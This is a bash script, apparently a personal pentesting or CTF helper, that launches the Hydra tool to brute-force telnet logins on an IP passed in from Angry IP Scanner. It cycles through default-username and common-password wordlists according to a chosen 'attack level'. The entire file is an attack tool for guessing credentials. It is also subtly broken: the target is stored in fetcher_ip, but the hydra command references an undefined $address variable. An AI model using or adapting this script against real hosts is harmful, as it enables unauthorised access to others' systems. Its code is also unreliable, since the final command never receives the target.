#!/bin/bash

# Angry IP information -----------------------------------------------------------
# | Angry Name                 | Execution String              | Run in Terminal | Directory |
# | -------------------------- | ----------------------------- | --------------- | --------- |
# | 23_TELNET - HYDRA | THIS_FILE ${fetcher.ip} ${fetcher.comment}| TRUE            |           |

# Script information -----------------------------------------------------------
# | Script Name       : HYDRA_TELNET.sh
# | Description       : Script for brute force hydra
# | Directory         : ~/CYBER_TOOLS/SCRIPTS/
# | Author            : Jordon Archer
# | Date              : August 24, 2023
# ------------------------------------------------------------------------------      :

# Assign the IP address to the variable
fetcher_ip=$1  # Replace with the actual IP address
#fetcher_ip="10.81.252.14"  # Replace with the actual IP address
comment=$2

mkdir ~/Documents/BOXES/$comment -p
cd ~/Documents/BOXES/$comment

# Define color variables
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
YELLOW=$(tput setaf 3)
NC=$(tput sgr0) # No Color

# Define username and password lists
user_name_list_1="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/http_default_users.txt"
user_name_list_2="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/cirt_default_usernames.txt"
user_name_list_3="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/multiple_sources_users.txt"
user_name_list_4="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/xato_net_usernames.txt"

password_list_1="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/http_default_passwords.txt"
password_list_2="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/unix_passwords.txt"
password_list_3="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/most_used_passwords.txt"
password_list_4="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/xato_net_passwords.txt"

# Ask the user for the level of attack
read -e -p "${YELLOW}Choose the level of attack (1/2/3/4): ${NC}" -i "1" attack_level

case $attack_level in
    1)
        user_name_list=$user_name_list_1
        password_list=$password_list_1
        verbose="-V"
        ;;
    2)
        user_name_list=$user_name_list_2
        password_list=$password_list_2
        verbose="-v"
        ;;
    3)
        user_name_list=$user_name_list_3
        password_list=$password_list_3
        verbose="-v"
        ;;
    4)
        user_name_list=$user_name_list_4
        password_list=$password_list_4
        verbose="-v"
        ;;
    *)
        echo "Invalid attack level. Defaulting to level 1."
        user_name_list=$user_name_list_1
        password_list=$password_list_1
        verbose="-V"
        ;;
esac

# Ask the user if they know the username
read -e -p "${YELLOW}Do you know the username? (y/n): ${NC}" -i "n" know_username

if [[ $know_username == "y" ]]; then
    read -e -p "${YELLOW}Enter the username: ${NC}" -i "" username
    username_section="-l $username"
else
    username_section="-L $user_name_list"
fi

# Ask the user if they know the password
read -e -p "${YELLOW}Do you know the password? (y/n): ${NC}" -i "n" know_password

if [[ $know_password == "y" ]]; then
    read -e -p "${YELLOW}Enter the password: ${NC}" -i "" password
    password_section="-p $password"
else
    password_section="-P $password_list"
fi

# Hydra attack based on user input

hydra $username_section $password_section $address telnet -e ns $verbose -I
# ...

echo -e "${RED}Hydra attack finished.${NC}"